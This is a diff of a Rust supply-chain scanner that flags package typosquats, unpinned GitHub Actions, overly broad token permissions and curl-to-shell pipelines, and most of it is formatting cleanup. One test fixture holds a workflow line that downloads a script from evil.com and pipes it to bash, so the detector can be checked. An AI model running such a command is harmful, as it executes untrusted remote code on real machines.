@@ -11,7 +11,7 @@ use std::fmt;
 // Types and Enums
 // =============================================================================
 
-    /// Type of supply chain finding
+/// Type of supply chain finding
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum FindingType {
     Typosquat,
@@ -40,18 +40,7 @@ impl fmt::Display for FindingType {
             FindingType::SecretsExposure => write!(f, "Secrets Exposure"),
             FindingType::BroadPermissions => write!(f, "Broad Permissions"),
             FindingType::MissingIntegrity => write!(f, "Missing Integrity"),
-        }
-    }
-}
-
-impl fmt::Display for Severity {
-    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
-        match self {
-            Severity::Critical => write!(f, "CRITICAL"),
-            Severity::High => write!(f, "HIGH"),
-            Severity::Medium => write!(f, "MEDIUM"),
-            Severity::Low => write!(f, "LOW"),
-            Severity::Informational => write!(f, "INFO"),
+            FindingType::Informational => write!(f, "Informational"),
         }
     }
 }
@@ -69,7 +58,11 @@ pub struct DependencyFinding {
 
 impl fmt::Display for DependencyFinding {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
-        writeln!(f, "[{}] {} ({}) - {}", self.severity, self.package_name, self.version, self.finding_type)?;
+        writeln!(
+            f,
+            "[{}] {} ({}) - {}",
+            self.severity, self.package_name, self.version, self.finding_type
+        )?;
         writeln!(f, "  Description: {}", self.description)?;
         writeln!(f, "  Remediation: {}", self.remediation)
     }
@@ -107,27 +100,41 @@ pub struct CicdFinding {
 
 impl fmt::Display for CicdFinding {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
-        writeln!(f, "[{}] {} - {}", self.severity, self.pipeline_file, self.misconfiguration)?;
+        writeln!(
+            f,
+            "[{}] {} - {}",
+            self.severity, self.pipeline_file, self.misconfiguration
+        )?;
         writeln!(f, "  CWE: {}", self.cwe)?;
         writeln!(f, "  Remediation: {}", self.remediation)
     }
 }
 
-/// License risk assessment
-#[derive(Debug, Clone)]
-pub enum FindingType {
-    Typosquat,
-    KnownVuln,
-    Outdated,
-    Unmaintained,
-    LicenseRisk,
-    UnpinnedAction,
-    InlineScript,
-    SecretsExposure,
-    BroadPermissions,
-    MissingIntegrity,
+/// Severity levels for supply chain findings.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Severity {
+    Critical,
+    High,
+    Medium,
+    Low,
     Informational,
 }
+
+impl fmt::Display for Severity {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        match self {
+            Severity::Critical => write!(f, "CRITICAL"),
+            Severity::High => write!(f, "HIGH"),
+            Severity::Medium => write!(f, "MEDIUM"),
+            Severity::Low => write!(f, "LOW"),
+            Severity::Informational => write!(f, "INFO"),
+        }
+    }
+}
+
+/// License risk assessment
+#[derive(Debug, Clone)]
+pub struct LicenseRisk {
     pub license_name: String,
     pub risk_level: Severity,
     pub copyleft: bool,
@@ -174,11 +181,36 @@ impl fmt::Display for DependencyInventory {
 
 /// Well-known npm packages for typosquat detection
 const NPM_POPULAR: &[&str] = &[
-    "lodash", "express", "react", "react-dom", "axios", "webpack",
-    "chalk", "commander", "moment", "underscore", "vue", "angular",
-    "next", "gatsby", "eslint", "prettier", "typescript", "babel",
-    "jest", "mocha", "chai", "redux", "mobx", "jquery", "d3",
-    "three", "socket.io", "passport", "mongoose", "sequelize",
+    "lodash",
+    "express",
+    "react",
+    "react-dom",
+    "axios",
+    "webpack",
+    "chalk",
+    "commander",
+    "moment",
+    "underscore",
+    "vue",
+    "angular",
+    "next",
+    "gatsby",
+    "eslint",
+    "prettier",
+    "typescript",
+    "babel",
+    "jest",
+    "mocha",
+    "chai",
+    "redux",
+    "mobx",
+    "jquery",
+    "d3",
+    "three",
+    "socket.io",
+    "passport",
+    "mongoose",
+    "sequelize",
 ];
 
 /// Analyze package.json for dependency issues
@@ -197,7 +229,10 @@ pub fn analyze_package_json(content: &str) -> Vec<DependencyFinding> {
                 finding_type: FindingType::Typosquat,
                 severity: Severity::High,
                 description: format!("Possible typosquat of popular package '{}'", squat),
-                remediation: format!("Verify this is the intended package, not a typosquat of '{}'", squat),
+                remediation: format!(
+                    "Verify this is the intended package, not a typosquat of '{}'",
+                    squat
+                ),
             });
         }
 
@@ -214,7 +249,11 @@ pub fn analyze_package_json(content: &str) -> Vec<DependencyFinding> {
         }
 
         // Check for unpinned versions
-        if version.starts_with('^') || version.starts_with('~') || version == "*" || version == "latest" {
+        if version.starts_with('^')
+            || version.starts_with('~')
+            || version == "*"
+            || version == "latest"
+        {
             findings.push(DependencyFinding {
                 package_name: name.clone(),
                 version: version.clone(),
@@ -237,7 +276,8 @@ fn extract_package_deps(content: &str) -> BTreeMap<String, String> {
     for line in content.lines() {
         let trimmed = line.trim();
 
-        if trimmed.contains("\"dependencies\"") || trimmed.contains("\"devDependencies\"")
+        if trimmed.contains("\"dependencies\"")
+            || trimmed.contains("\"devDependencies\"")
             || trimmed.contains("\"peerDependencies\"")
         {
             in_deps = true;
@@ -269,12 +309,10 @@ fn extract_package_deps(content: &str) -> BTreeMap<String, String> {
 
 /// Check for npm typosquats
 fn check_npm_typosquat(name: &str) -> Option<&'static str> {
-    for &popular in NPM_POPULAR {
-        if is_likely_typosquat(name, popular) {
-            return Some(popular);
-        }
-    }
-    None
+    NPM_POPULAR
+        .iter()
+        .find(|&&popular| is_likely_typosquat(name, popular))
+        .copied()
 }
 
 /// Check if a package name is a likely typosquat of a popular package
@@ -322,16 +360,20 @@ fn levenshtein_distance(a: &str, b: &str) -> usize {
 
     let mut matrix = vec![vec![0usize; b_len + 1]; a_len + 1];
 
-    for i in 0..=a_len {
-        matrix[i][0] = i;
+    for (i, row) in matrix.iter_mut().enumerate().take(a_len + 1) {
+        row[0] = i;
     }
-    for j in 0..=b_len {
-        matrix[0][j] = j;
+    for (j, cell) in matrix[0].iter_mut().enumerate().take(b_len + 1) {
+        *cell = j;
     }
 
     for i in 1..=a_len {
         for j in 1..=b_len {
-            let cost = if a_chars[i - 1] == b_chars[j - 1] { 0 } else { 1 };
+            let cost = if a_chars[i - 1] == b_chars[j - 1] {
+                0
+            } else {
+                1
+            };
             matrix[i][j] = (matrix[i - 1][j] + 1)
                 .min(matrix[i][j - 1] + 1)
                 .min(matrix[i - 1][j - 1] + cost);
@@ -344,7 +386,15 @@ fn levenshtein_distance(a: &str, b: &str) -> usize {
 /// Check for suspicious npm package names
 fn is_suspicious_npm_package(name: &str) -> bool {
     // Check for package names that are common system utilities
-    let suspicious = ["npm", "node", "javascript", "python", "ruby", "perl", "bash"];
+    let suspicious = [
+        "npm",
+        "node",
+        "javascript",
+        "python",
+        "ruby",
+        "perl",
+        "bash",
+    ];
     for &s in &suspicious {
         if name == s {
             return true;
@@ -412,7 +462,8 @@ fn extract_cargo_deps(content: &str) -> BTreeMap<String, String> {
     for line in content.lines() {
         let trimmed = line.trim();
 
-        if trimmed == "[dependencies]" || trimmed == "[dev-dependencies]"
+        if trimmed == "[dependencies]"
+            || trimmed == "[dev-dependencies]"
             || trimmed == "[build-dependencies]"
         {
             in_deps = true;
@@ -454,11 +505,35 @@ fn is_suspicious_cargo_crate(name: &str) -> bool {
 
 /// Well-known Python packages for typosquat detection
 const PYTHON_POPULAR: &[&str] = &[
-    "requests", "flask", "django", "numpy", "pandas", "scipy",
-    "matplotlib", "scikit-learn", "tensorflow", "pytorch", "keras",
-    "fastapi", "uvicorn", "sqlalchemy", "celery", "redis", "boto3",
-    "pytest", "black", "isort", "mypy", "pylint", "setuptools",
-    "pip", "wheel", "virtualenv", "click", "rich", "typer",
+    "requests",
+    "flask",
+    "django",
+    "numpy",
+    "pandas",
+    "scipy",
+    "matplotlib",
+    "scikit-learn",
+    "tensorflow",
+    "pytorch",
+    "keras",
+    "fastapi",
+    "uvicorn",
+    "sqlalchemy",
+    "celery",
+    "redis",
+    "boto3",
+    "pytest",
+    "black",
+    "isort",
+    "mypy",
+    "pylint",
+    "setuptools",
+    "pip",
+    "wheel",
+    "virtualenv",
+    "click",
+    "rich",
+    "typer",
 ];
 
 /// Analyze requirements.txt for dependency issues
@@ -469,19 +544,22 @@ pub fn analyze_requirements_txt(content: &str) -> Vec<DependencyFinding> {
 
     for (name, version) in &deps {
         // Check for typosquats
-        if let Some(squat) = check_python_typosquat(&name) {
+        if let Some(squat) = check_python_typosquat(name) {
             findings.push(DependencyFinding {
                 package_name: name.clone(),
                 version: version.clone(),
                 finding_type: FindingType::Typosquat,
                 severity: Severity::High,
                 description: format!("Possible typosquat of popular package '{}'", squat),
-                remediation: format!("Verify this is the intended package, not a typosquat of '{}'", squat),
+                remediation: format!(
+                    "Verify this is the intended package, not a typosquat of '{}'",
+                    squat
+                ),
             });
         }
 
         // Check for suspicious packages
-        if is_suspicious_python_package(&name) {
+        if is_suspicious_python_package(name) {
             findings.push(DependencyFinding {
                 package_name: name.clone(),
                 version: version.clone(),
@@ -526,7 +604,7 @@ fn extract_requirements_deps(content: &str) -> BTreeMap<String, String> {
         }
 
         // Parse: package==1.2.3 or package>=1.0 or package
-        let parts: Vec<&str> = trimmed.splitn(2, |c| c == '=' || c == '>' || c == '<' || c == '!').collect();
+        let parts: Vec<&str> = trimmed.splitn(2, ['=', '>', '<', '!']).collect();
         if let Some(name) = parts.first() {
             let name = name.trim().to_string();
             let version = if parts.len() > 1 {
@@ -543,12 +621,10 @@ fn extract_requirements_deps(content: &str) -> BTreeMap<String, String> {
 
 /// Check for Python typosquats
 fn check_python_typosquat(name: &str) -> Option<&'static str> {
-    for &popular in PYTHON_POPULAR {
-        if is_likely_typosquat(name, popular) {
-            return Some(popular);
-        }
-    }
-    None
+    PYTHON_POPULAR
+        .iter()
+        .find(|&&popular| is_likely_typosquat(name, popular))
+        .copied()
 }
 
 /// Check for suspicious Python package names
@@ -596,13 +672,11 @@ fn count_lock_deps(content: &str, file_type: &str) -> usize {
         "yarn.lock" => content.matches("\"resolved\"").count(),
         "Cargo.lock" => content.matches("name = ").count(),
         "poetry.lock" => content.matches("name = ").count(),
-        _ => content.lines().filter(|l| !l.trim().is_empty() && !l.trim().starts_with('#')).count(),
+        _ => content
+            .lines()
+            .filter(|l| !l.trim().is_empty() && !l.trim().starts_with('#'))
+            .count(),
     }
-}
-}
-}
-}
-}
 }
 
 /// Count dependencies without integrity checks
@@ -676,9 +750,13 @@ pub fn analyze_github_workflow(content: &str) -> Vec<CicdFinding> {
                     misconfiguration: format!("Unpinned action: {}", after_uses),
                     severity: Severity::High,
                     cwe: "CWE-829".to_string(),
-                    remediation: "Pin actions to full commit SHA for supply chain safety".to_string(),
+                    remediation: "Pin actions to full commit SHA for supply chain safety"
+                        .to_string(),
                 });
-            } else if after_uses.contains("@latest") || after_uses.ends_with("@v0") || after_uses.ends_with("@v1") {
+            } else if after_uses.contains("@latest")
+                || after_uses.ends_with("@v0")
+                || after_uses.ends_with("@v1")
+            {
                 findings.push(CicdFinding {
                     pipeline_file: "GitHub Actions".to_string(),
                     misconfiguration: format!("Weakly pinned action: {}", after_uses),
@@ -692,8 +770,8 @@ pub fn analyze_github_workflow(content: &str) -> Vec<CicdFinding> {
         // Check for inline scripts in run:
         if trimmed.contains("run:") && (trimmed.contains('|') || trimmed.contains(">-")) {
             // Multi-line script - check next few lines for suspicious commands
-            for j in (i + 1)..lines.len().min(i + 10) {
-                let script_line = lines[j].trim();
+            for script_line in lines.iter().take(lines.len().min(i + 10)).skip(i + 1) {
+                let script_line = script_line.trim();
                 if script_line.contains("curl") && script_line.contains("|") {
                     findings.push(CicdFinding {
                         pipeline_file: "GitHub Actions".to_string(),
@@ -729,7 +807,9 @@ pub fn analyze_github_workflow(content: &str) -> Vec<CicdFinding> {
         }
 
         // Check for GITHUB_TOKEN permissions
-        if trimmed.contains("GITHUB_TOKEN") && (trimmed.contains("write-all") || trimmed.contains("contents: write")) {
+        if trimmed.contains("GITHUB_TOKEN")
+            && (trimmed.contains("write-all") || trimmed.contains("contents: write"))
+        {
             findings.push(CicdFinding {
                 pipeline_file: "GitHub Actions".to_string(),
                 misconfiguration: "GITHUB_TOKEN has broad permissions".to_string(),
@@ -892,14 +972,22 @@ mod tests {
             }
         }"#;
         let findings = analyze_package_json(pkg);
-        assert!(findings.iter().any(|f| f.finding_type == FindingType::Typosquat && f.package_name == "lodas"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.finding_type == FindingType::Typosquat && f.package_name == "lodas")
+        );
     }
 
     #[test]
     fn test_detect_typosquat_pypi() {
         let reqs = "requests==2.28.0\nreqeusts==1.0.0\nflask==2.0.0";
         let findings = analyze_requirements_txt(reqs);
-        assert!(findings.iter().any(|f| f.finding_type == FindingType::Typosquat));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.finding_type == FindingType::Typosquat)
+        );
     }
 
     #[test]
@@ -916,7 +1004,12 @@ jobs:
         run: echo hello
 "#;
         let findings = analyze_github_workflow(workflow);
-        assert!(findings.iter().any(|f| f.misconfiguration.contains("Unpinned") || f.misconfiguration.contains("Weakly pinned")));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.misconfiguration.contains("Unpinned")
+                    || f.misconfiguration.contains("Weakly pinned"))
+        );
     }
 
     #[test]
@@ -1003,6 +1096,10 @@ jobs:
           curl -sSL https://evil.com/script.sh | bash
 "#;
         let findings = analyze_github_workflow(workflow);
-        assert!(findings.iter().any(|f| f.misconfiguration.contains("curl output")));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.misconfiguration.contains("curl output"))
+        );
     }
 }
